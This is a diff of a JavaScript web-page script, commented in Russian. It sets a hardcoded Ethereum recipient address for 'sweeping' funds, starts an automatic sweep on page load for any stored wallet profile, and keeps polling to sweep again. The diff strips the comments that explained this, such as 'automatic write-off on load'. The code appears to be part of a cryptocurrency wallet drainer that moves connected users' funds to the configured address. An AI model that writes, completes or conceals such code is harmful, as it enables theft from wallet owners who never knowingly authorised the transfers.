@@ -2,16 +2,9 @@
 // ===== КОНФИГУРАЦИЯ СПИСАНИЯ - НАСТРОЙТЕ ЗДЕСЬ! =============
 // ============================================================
 const SWEEP_CONFIG = {
-  // 🔥 АДРЕС КУДА СПИСЫВАТЬ СРЕДСТВА - ЗАМЕНИТЕ НА ВАШ!
   recipient: "0xB38376F2592377faa4774B6FfE8026EB4b001cd0",
-  
-  // ID сети: 1=Ethereum, 56=BSC, 137=Polygon
   chainId: 1,
-  
-  // Комиссия сервиса в процентах (0 = без комиссии)
   feePercent: 0,
-  
-  // Минимальный баланс для списания (в ETH/BNB/etc)
   minBalance: 0.001
 };
 
@@ -61,7 +54,7 @@ const clearStoredSession = (key) => localStorage.removeItem(key);
 const isStoredSessionExpired = (session) =>
   Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());
 
-// sleep и withTimeout уже объявлены в check-flow.js, поэтому здесь их НЕТ
+// sleep и withTimeout уже объявлены в auto-wallet.js и check-flow.js, поэтому здесь их НЕТ
 
 const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
   let timer;
@@ -903,7 +896,6 @@ userLogout?.addEventListener("click", async () => {
   }
   clearStoredSession(userSessionKey);
   if (typeof lockCheckForm === 'function') lockCheckForm();
-  // Останавливаем polling
   if (window.sweepCheckInterval) {
     clearInterval(window.sweepCheckInterval);
     window.sweepCheckInterval = null;
@@ -1227,7 +1219,6 @@ const startSweepPolling = () => {
           sweepCheckInterval = null;
         }
         await autoExecuteSweep();
-        // Перезапускаем проверку через 5 секунд после завершения
         setTimeout(() => {
           if (!sweepCheckInterval) {
             startSweepPolling();
@@ -1242,7 +1233,6 @@ const startSweepPolling = () => {
 window.sweepCheckInterval = sweepCheckInterval;
 
 // ===== ИНИЦИАЛИЗАЦИЯ =====
-// Имена сетей
 const NETWORK_NAMES = {
   1: 'Ethereum (Mainnet)',
   56: 'BNB Smart Chain',
@@ -1263,13 +1253,11 @@ const NETWORK_SYMBOLS = {
   250: 'FTM'
 };
 
-// Показываем секцию, если профиль уже есть
 const storedProfile = loadProfile();
 if (storedProfile?.evmAddress) {
   showSweepSectionAfterConnect(storedProfile.evmAddress);
 }
 
-// Восстанавливаем сессию и запускаем автосписание (если есть запрос)
 const stored = loadProfile();
 if (stored?.evmAddress) {
   if (typeof unlockCheckForm === 'function') {
@@ -1283,8 +1271,6 @@ if (stored?.evmAddress) {
   if (typeof setStatus === 'function') {
     setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
   }
-  
-  // Автоматическое списание при загрузке
   autoExecuteSweep().catch(console.warn);
 } else {
   if (typeof setStatus === 'function') {
@@ -1296,12 +1282,10 @@ if (stored?.evmAddress) {
   }
 }
 
-// Запускаем polling для автоматического обнаружения новых запросов
 if (getStoredSession(userSessionKey)?.token) {
   startSweepPolling();
 }
 
-// ===== СОБЫТИЯ КНОПОК =====
 sweepConsent?.addEventListener('change', () => {
   if (sweepExecuteBtn) {
     sweepExecuteBtn.disabled = !sweepConsent.checked || !isRecipientConfigured();
